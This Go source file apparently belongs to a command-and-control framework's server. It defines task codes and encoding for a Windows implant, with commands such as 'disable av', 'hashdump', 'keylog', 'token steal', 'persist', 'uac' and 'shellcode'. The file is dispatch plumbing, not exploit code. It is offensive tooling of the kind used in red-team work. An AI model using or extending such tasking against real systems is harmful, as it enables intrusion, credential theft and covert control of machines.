package task

import (
	"encoding/json"
	"fmt"
)

// TASK CODE
// *sync this with the code in 'payload/win/implant/include/core/task.hpp'
const (
	TASK_ASSEMBLY     = 0x01
	TASK_CAT          = 0x02
	TASK_CD           = 0x03
	TASK_CMD          = 0x04
	TASK_CONNECT      = 0x05
	TASK_CP           = 0x06
	TASK_DISABLE_AV   = 0x07
	TASK_DLL          = 0x08
	TASK_DOWNLOAD     = 0x09
	TASK_ENV_LS       = 0x10
	TASK_FIND         = 0x11
	TASK_GROUP_LS     = 0x12
	TASK_HASHDUMP     = 0x13
	TASK_HISTORY      = 0x14
	TASK_IP           = 0x15
	TASK_JITTER       = 0x16
	TASK_KEYLOG       = 0x17
	TASK_KILL         = 0x18
	TASK_KILLDATE     = 0x19
	TASK_LS           = 0x20
	TASK_MIGRATE      = 0x21
	TASK_MKDIR        = 0x22
	TASK_MV           = 0x23
	TASK_NET          = 0x24
	TASK_PE           = 0x25
	TASK_PERSIST      = 0x26
	TASK_PROCDUMP     = 0x27
	TASK_PS_KILL      = 0x28
	TASK_PS_LS        = 0x29
	TASK_PWD          = 0x30
	TASK_REG_QUERY    = 0x31
	TASK_RM           = 0x32
	TASK_RMDIR        = 0x33
	TASK_RPORTFWD_ADD = 0x34
	TASK_RPORTFWD_LS  = 0x35
	TASK_RPORTFWD_RM  = 0x36
	TASK_RUNAS        = 0x37
	TASK_SCREENSHOT   = 0x38
	TASK_SHELLCODE    = 0x39
	TASK_SLEEP        = 0x40
	TASK_SYSINFO      = 0x41
	TASK_TOKEN_REVERT = 0x42
	TASK_TOKEN_STEAL  = 0x43
	TASK_UAC          = 0x44
	TASK_UPLOAD       = 0x45
	TASK_USER_LS      = 0x46
	TASK_WHOAMI       = 0x47
	TASK_WHOAMI_PRIV  = 0x48
)

func GetTaskCode(task string) (int, error) {
	switch task {
	case "assembly":
		return TASK_ASSEMBLY, nil
	case "cat":
		return TASK_CAT, nil
	case "cd":
		return TASK_CD, nil
	case "cmd":
		return TASK_CMD, nil
	case "connect":
		return TASK_CONNECT, nil
	case "cp":
		return TASK_CP, nil
	case "disable av":
		return TASK_DISABLE_AV, nil
	case "dll":
		return TASK_DLL, nil
	case "download":
		return TASK_DOWNLOAD, nil
	case "env ls", "envs":
		return TASK_ENV_LS, nil
	case "find":
		return TASK_FIND, nil
	case "group ls", "groups":
		return TASK_GROUP_LS, nil
	case "hashdump":
		return TASK_HASHDUMP, nil
	case "history":
		return TASK_HISTORY, nil
	case "ip":
		return TASK_IP, nil
	case "jitter":
		return TASK_JITTER, nil
	case "keylog":
		return TASK_KEYLOG, nil
	case "kill":
		return TASK_KILL, nil
	case "killdate":
		return TASK_KILLDATE, nil
	case "ls":
		return TASK_LS, nil
	case "migrate":
		return TASK_MIGRATE, nil
	case "mkdir":
		return TASK_MKDIR, nil
	case "mv":
		return TASK_MV, nil
	case "net":
		return TASK_NET, nil
	case "pe":
		return TASK_PE, nil
	case "persist":
		return TASK_PERSIST, nil
	case "procdump":
		return TASK_PROCDUMP, nil
	case "ps kill":
		return TASK_PS_KILL, nil
	case "ps ls":
		return TASK_PS_LS, nil
	case "pwd":
		return TASK_PWD, nil
	case "reg query":
		return TASK_REG_QUERY, nil
	case "rm":
		return TASK_RM, nil
	case "rmdir":
		return TASK_RMDIR, nil
	case "rportfwd add":
		return TASK_RPORTFWD_ADD, nil
	case "rportfwd ls":
		return TASK_RPORTFWD_LS, nil
	case "rportfwd rm":
		return TASK_RPORTFWD_RM, nil
	case "runas":
		return TASK_RUNAS, nil
	case "screenshot":
		return TASK_SCREENSHOT, nil
	case "shellcode":
		return TASK_SHELLCODE, nil
	case "sleep":
		return TASK_SLEEP, nil
	case "sysinfo":
		return TASK_SYSINFO, nil
	case "token revert":
		return TASK_TOKEN_REVERT, nil
	case "token steal":
		return TASK_TOKEN_STEAL, nil
	case "uac":
		return TASK_UAC, nil
	case "upload":
		return TASK_UPLOAD, nil
	case "user ls", "users":
		return TASK_USER_LS, nil
	case "whoami":
		return TASK_WHOAMI, nil
	case "whoami priv":
		return TASK_WHOAMI_PRIV, nil
	default:
		return -1, fmt.Errorf("invalid task command")
	}
}

type Command struct {
	Name string `json:"name"`
	Code int    `json:"code"`
}

type Task struct {
	Command Command           `json:"command"`
	Args    map[string]string `json:"args"`
}

func NewTask(taskName string, args map[string]string) (*Task, error) {
	taskCode, err := GetTaskCode(taskName)
	if err != nil {
		return nil, err
	}

	return &Task{
		Command: Command{
			Name: taskName,
			Code: taskCode,
		},
		Args: args,
	}, nil
}

func (t *Task) Encode() (string, error) {
	jsonData, err := json.Marshal(*t)
	if err != nil {
		return "", err
	}

	return string(jsonData), nil
}

// The function is used for pretty print when 'task' and 'loot' commands.
func FormatTaskFromJsonStr(taskJSONStr string) (string, error) {
	var task Task
	if err := json.Unmarshal([]byte(taskJSONStr), &task); err != nil {
		return "", err
	}

	command := task.Command.Name
	args := task.Args

	var taskStr string
	taskStr += command

	for key, val := range args {
		taskStr += fmt.Sprintf(" --%s %s", key, val)
	}

	return taskStr, nil
}

type TaskResult struct {
	Task   Task   `json:"task"`
	Result string `json:"result"`
}
